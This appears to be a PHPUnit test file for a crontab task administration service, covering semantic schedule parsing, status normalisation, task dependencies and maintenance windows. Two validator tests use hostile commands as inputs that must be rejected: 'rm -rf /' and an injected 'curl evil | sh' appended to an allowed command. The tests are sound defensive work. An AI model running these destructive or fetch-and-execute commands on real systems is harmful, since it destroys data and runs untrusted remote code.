<?php

declare(strict_types=1);

namespace wise\crontab\test;

use wise\crontab\exception\CrontabException;
use wise\crontab\model\TaskModel;
use wise\crontab\service\TaskAdminService;

/**
 * 管理面服务测试（任务 / 依赖 / 维护窗口）
 */
class TaskAdminServiceTest extends DatabaseTestCase
{
    private function service(): TaskAdminService
    {
        return new TaskAdminService([
            'allowed_command_patterns' => ['/^php\s+/', '/^echo\s+/'],
            'default_timeout'          => 300,
            'default_max_retries'      => 0,
        ]);
    }

    public function testCreateNormalizesSemanticSchedule(): void
    {
        $task = $this->service()->create([
            'name'     => 'demo',
            'command'  => 'php think demo',
            'schedule' => '每天凌晨2点',
        ]);

        $this->assertSame('0 2 * * *', $task['cron_expression']);
        $this->assertSame('cron', $task['schedule_type']);
        $this->assertSame('每天 02:00', $task['schedule_description']);
        $this->assertNotEmpty($task['next_run_at']);
    }

    public function testCreateOnceTask(): void
    {
        $task = $this->service()->create([
            'name'     => 'once_demo',
            'command'  => 'php think once',
            'schedule' => 'once at 2026-09-20 10:00',
        ]);

        $this->assertSame('once', $task['schedule_type']);
        $this->assertSame('2026-09-20 10:00:00', $task['run_at']);
        $this->assertSame('2026-09-20 10:00:00', $task['next_run_at']);
    }

    public function testCreateRejectsDuplicateName(): void
    {
        $service = $this->service();
        $service->create(['name' => 'dup', 'command' => 'php think a', 'schedule' => '每分钟']);

        $this->expectException(CrontabException::class);
        $service->create(['name' => 'dup', 'command' => 'php think b', 'schedule' => '每分钟']);
    }

    public function testCreateRejectsCommandOutsideWhitelist(): void
    {
        $this->expectException(CrontabException::class);

        $this->service()->create([
            'name'     => 'bad',
            'command'  => 'rm -rf /',
            'schedule' => '每分钟',
        ]);
    }

    /**
     * 回归：保存时就拒绝命令拼接（前缀白名单本身挡不住 `php ...; rm -rf /`）
     */
    public function testCreateRejectsShellInjection(): void
    {
        $this->expectException(CrontabException::class);

        $this->service()->create([
            'name'     => 'inject',
            'command'  => 'php think demo; curl evil | sh',
            'schedule' => '每分钟',
        ]);
    }

    public function testCreateRejectsInvalidSchedule(): void
    {
        $this->expectException(CrontabException::class);

        $this->service()->create([
            'name'     => 'bad_schedule',
            'command'  => 'php think demo',
            'schedule' => '随便写点什么',
        ]);
    }

    public function testUpdateKeepsUnchangedFields(): void
    {
        $service = $this->service();
        $service->create(['name' => 'upd', 'command' => 'php think upd', 'schedule' => '每分钟']);

        $updated = $service->update('upd', ['schedule' => '每5分钟']);

        $this->assertSame('*/5 * * * *', $updated['cron_expression']);
        $this->assertSame('php think upd', $updated['command']);
    }

    public function testEnableDisableAndDelete(): void
    {
        $service = $this->service();
        $service->create(['name' => 'toggle', 'command' => 'php think t', 'schedule' => '每分钟']);

        $this->assertTrue($service->disable('toggle'));
        $this->assertSame(0, (int) $service->find('toggle')['status']);

        $this->assertTrue($service->enable('toggle'));
        $this->assertSame(1, (int) $service->find('toggle')['status']);

        $this->assertTrue($service->delete('toggle'));
        $this->assertNull($service->find('toggle'));
    }

    public function testListFiltersByStatus(): void
    {
        $service = $this->service();
        $service->create(['name' => 'on', 'command' => 'php think a', 'schedule' => '每分钟']);
        $service->create(['name' => 'off', 'command' => 'php think b', 'schedule' => '每分钟', 'status' => 0]);

        $this->assertCount(1, $service->list(['status' => 1]));
        $this->assertCount(1, $service->list(['status' => 0]));
        $this->assertCount(2, $service->list());
    }

    public function testCreateNormalizesStatusToZeroOrOne(): void
    {
        $cases = [
            'default'          => [null, 1],
            'bool true'        => [true, 1],
            'bool false'       => [false, 0],
            'int 1'            => [1, 1],
            'int 0'            => [0, 0],
            'int 2'            => [2, 1],
            'string 1'         => ['1', 1],
            'string 0'         => ['0', 0],
            'string true'      => ['true', 1],
            'string false'     => ['false', 0],
            'string on'        => ['on', 1],
            'string off'       => ['off', 0],
            'string enabled'   => ['enabled', 1],
            'string disabled'  => ['disabled', 0],
            'empty string'     => ['', 1],
        ];

        foreach ($cases as $label => [$input, $expected]) {
            $data = ['name' => 'status_' . md5((string) $label), 'command' => 'php think s', 'schedule' => '每分钟'];
            if ($input !== null) {
                $data['status'] = $input;
            }

            $task = $this->service()->create($data);

            $this->assertSame(
                $expected,
                (int) TaskModel::where('name', $task['name'])->value('status'),
                $label
            );
        }
    }

    public function testUpdateNormalizesStatus(): void
    {
        $service = $this->service();
        $service->create(['name' => 'upd_status', 'command' => 'php think u', 'schedule' => '每分钟']);

        $this->assertSame(1, (int) TaskModel::where('name', 'upd_status')->value('status'));
        $updated = $service->update('upd_status', ['status' => 'off']);
        $this->assertSame(0, (int) $updated['status']);

        $updated = $service->update('upd_status', ['status' => 'on']);
        $this->assertSame(1, (int) $updated['status']);
    }

    public function testDependencyLifecycle(): void
    {
        $service = $this->service();
        $service->create(['name' => 'main', 'command' => 'php think main', 'schedule' => '每分钟']);
        $service->create(['name' => 'pre', 'command' => 'php think pre', 'schedule' => '每分钟']);

        $this->assertTrue($service->addDependency('main', 'pre', 'completed'));

        $deps = $service->dependencies('main');
        $this->assertCount(1, $deps);
        $this->assertSame('pre', $deps[0]['depends_on_name']);
        $this->assertSame('completed', $deps[0]['condition']);

        $this->assertTrue($service->removeDependency('main', 'pre'));
        $this->assertSame([], $service->dependencies('main'));
    }

    public function testDependencyRejectsInvalidCondition(): void
    {
        $service = $this->service();
        $service->create(['name' => 'a', 'command' => 'php think a', 'schedule' => '每分钟']);
        $service->create(['name' => 'b', 'command' => 'php think b', 'schedule' => '每分钟']);

        $this->expectException(CrontabException::class);
        $service->addDependency('a', 'b', 'unknown');
    }

    public function testWindowLifecycle(): void
    {
        $service = $this->service();

        $id = $service->addWindow([
            'start_at' => '22:00',
            'end_at'   => '02:00',
            'reason'   => '夜间发版',
        ]);

        $this->assertGreaterThan(0, $id);
        $this->assertCount(1, $service->windows());

        $this->assertTrue($service->removeWindow($id));
        $this->assertSame([], $service->windows());
    }

    public function testWindowRejectsBadTime(): void
    {
        $this->expectException(CrontabException::class);

        $this->service()->addWindow(['start_at' => '晚上', 'end_at' => '02:00']);
    }

    public function testRefreshNextRunWritesColumn(): void
    {
        $service = $this->service();
        $task = $service->create(['name' => 'nr', 'command' => 'php think nr', 'schedule' => '每天凌晨3点']);

        $this->assertSame(1, $service->refreshNextRun());

        $fresh = $service->find('nr');
        $this->assertNotEmpty($fresh['next_run_at']);
        $this->assertStringContainsString('03:00:00', (string) $fresh['next_run_at']);
    }

    public function testRunNowExecutesImmediately(): void
    {
        if (!self::canSpawnProcess()) {
            $this->markTestSkipped('当前环境无法创建子进程');
        }

        $service = $this->service();
        $service->create(['name' => 'run_now', 'command' => 'echo hello', 'schedule' => '每天凌晨3点']);

        $result = $service->runNow('run_now');

        $this->assertSame('success', $result['status']);
        $this->assertStringContainsString('hello', $result['output']);
    }

    private static function canSpawnProcess(): bool
    {
        static $can = null;

        if ($can === null) {
            try {
                $process = \Symfony\Component\Process\Process::fromShellCommandline('echo probe');
                $process->run();
                $can = $process->getExitCode() === 0;
            } catch (\Throwable $e) {
                $can = false;
            }
        }

        return $can;
    }
}
